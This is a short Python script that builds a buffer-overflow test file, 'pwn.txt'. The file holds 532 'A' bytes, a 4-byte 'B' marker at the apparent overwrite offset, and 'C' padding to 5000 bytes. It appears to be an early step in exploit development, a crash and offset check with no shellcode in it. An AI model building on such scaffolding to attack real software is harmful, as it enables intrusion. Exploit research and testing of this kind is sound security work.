#!/usr/bin/python

payload  = "A" * 532
payload += "B" * 4
payload += "C" * (5000 - len(payload))

f = open('pwn.txt', 'w')
f.write(payload)
f.close()

